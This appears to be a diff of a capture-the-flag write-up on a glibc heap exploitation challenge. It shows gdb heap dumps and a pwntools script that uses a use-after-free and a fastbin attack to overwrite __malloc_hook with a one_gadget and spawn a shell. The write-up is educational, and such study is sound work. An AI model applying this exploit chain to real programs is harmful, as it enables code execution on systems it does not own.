@@ -54,7 +54,7 @@ gef➤  x/100gx 0x0000555555559000
 0x555555559000: 0x0000000000000000      0x0000000000000031 <- topic chunk
 0x555555559010: 0x4141414141414141      0x0000000000000000
 0x555555559020: 0x0000000000000000      0x0000555555559040 <- pointer to body
-0x555555559030: 0x0000000000000032      0x0000000000000041 <- 0x32 is the size of the body
+0x555555559030: 0x0000000000000032      0x0000000000000041 <- body chunk
 0x555555559040: 0x4242424242424242      0x4242424242424242 <- text of the body
 0x555555559050: 0x4242424242424242      0x4242424242424242
 0x555555559060: 0x4242424242424242      0x0042424242424242
@@ -100,7 +100,7 @@ leak = u64(show(0).split('\n')[1].split(' : ')[1].ljust(8, '\x00'))
 
 Now that we have a leak, we need to get a chunk on top of `__malloc_hook` so we can overwrite it with a one gadget. We will do this by doing what is known as a fastbin attack.
 
-When fastbin sized chunks are freed, they get stored in a singly stored linked list known as a fastbin. The way each free chunk keeps track of itself in the list (in a 64-bit system) is by setting aside the first 8 bytes of the chunk for what is called the `fd` pointer, which is essentially a pointer to the next free chunk in this linked list. This is demonstrated below using chunks B and C from our exploit. Note that chunk B was freed first, followed by chunk C:
+When fastbin sized chunks are freed, they get stored in a singly stored linked list known as a fastbin. The way each free chunk keeps track of itself in the list is by setting aside the first 8 bytes of the chunk (in a 64-bit system) for what is called the `fd` pointer, which is essentially a pointer to the next free chunk in this linked list. This is demonstrated below using chunks B and C from our exploit. Note that chunk B was freed first, followed by chunk C:
 ```c
 gef➤  x/300gx 0x00005564e50e9000
 0x5564e50e9000: 0x0000000000000000      0x0000000000000031 <- chunk A topic (free)
@@ -145,7 +145,7 @@ errout:
 }
 ```
 
-Basically, the pointer that we overwrite `fd` with must point to a memory region that is 16 byte aligned and has a size that will fit in this specific fastbin. Otherwise, we will get the `"malloc(): memory corruption (fast)"` error.
+Basically, the pointer that we overwrite `fd` with must point to a memory region that "looks" like a chunk with a size that will fit in this specific fastbin. Otherwise, we will get the `"malloc(): memory corruption (fast)"` error.
 
 To elaborate, the pointer must point to a memory region that looks like this (using chunk C's body as an example), where the chunk size must be between 0x70 - 0x7f:
 ```c
@@ -195,7 +195,8 @@ Since we have a UAF, we can easily just read the current `fd` pointer that chunk
 # So we initially read the fd pointer and store it
 topic_fd = u64(show(2).split('\n')[0].split(' : ')[1].ljust(8, '\x00'))
 
-# Now overwrite the fd pointer of 2's description to __malloc_hook-0x30+0xd
+# Now overwrite the fd pointer of chunk C's body to __malloc_hook-0x30+0xd
+# Ensure not to change chunk C's topic's fd pointer
 edit(2, p64(topic_fd), p64(malloc_hook))
 ```
 
@@ -203,8 +204,17 @@ Now we simply perform two mallocs. The first malloc gives us back chunk C and pu
 ```python
 # Second allocation will be at __malloc_hook-0x30+0xd
 # Overwrite __malloc_hook with one_gadget
-add(4, 'E'*0x8, 'E'*0x66)
-add(5, 'F'*0x8, 'F'*0x13 + p64(one_gadget) + 'F'*0x4b)
+add(4, 'E'*0x8, 'E'*0x66) # Chunk C given back to us
+add(5, 'F'*0x8, 'F'*0x13 + p64(one_gadget) + 'F'*0x4b) # Chunk on __malloc_hook - 0x30 + 0xd
+```
+```c
+gef➤  x/20gx 0x7f0633c26aed - 0xd
+0x7f0633c26ae0 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000
+0x7f0633c26af0 <_IO_wide_data_0+304>:   0x00007f0633c25260      0x4646460000000000
+0x7f0633c26b00 <__memalign_hook>:       0x4646464646464646      0x4646464646464646
+0x7f0633c26b10 <__malloc_hook>: 0x00007f06339522a4      0x4646464646464646 <- __malloc_hook overwritten with one gadget
+0x7f0633c26b20 <main_arena>:    0x4646464646464646      0x4646464646464646
+...
 ```
 
 And finally, we just need to call `malloc` one more time to get a shell.
@@ -248,7 +258,7 @@ def add(idx, topic, body):
     p.sendlineafter('>>', '1')
     p.sendlineafter('index\n', str(idx))
     p.sendlineafter('topic\n', topic)
-    p.sendlineafter('body\n', str(len(body)+2)) # Add two to the size here due to application logic stuff
+    p.sendlineafter('body\n', str(len(body)+2)) # +2 due to application logic stuff
     p.sendlineafter('body\n', body)
 
 def edit(idx, topic, body):
@@ -302,21 +312,22 @@ log.info('Libc base: ' + hex(libc.address))
 log.info('__malloc_hook: ' + hex(malloc_hook))
 log.info('one_gadget: ' + hex(one_gadget))
 
-# Fastbin attack time. Free 1 and 2
+# Fastbin attack time. Free chunks B and C
 free(1)
 free(2)
 
 # We must have a valid pointer at the fd of the topic chunk, otherwise the program will crash
-# So we initially read the fd pointer and store it
+# So we initially read the fd pointer of chunk C's topic and store it
 topic_fd = u64(show(2).split('\n')[0].split(' : ')[1].ljust(8, '\x00'))
 
-# Now overwrite the fd pointer of 2's description to __malloc_hook-0x30+0xd
+# Now overwrite the fd pointer of chunk C's body to __malloc_hook-0x30+0xd
+# Ensure not to change chunk C's topic's fd pointer
 edit(2, p64(topic_fd), p64(malloc_hook))
 
 # Second allocation will be at __malloc_hook-0x30+0xd
 # Overwrite __malloc_hook with one_gadget
-add(4, 'E'*0x8, 'E'*0x66)
-add(5, 'F'*0x8, 'F'*0x13 + p64(one_gadget) + 'F'*0x4b)
+add(4, 'E'*0x8, 'E'*0x66) # Chunk C given back to us
+add(5, 'F'*0x8, 'F'*0x13 + p64(one_gadget) + 'F'*0x4b) # Chunk on __malloc_hook - 0x30 + 0xd
 
 # Get shell
 p.sendlineafter('>>', '1')
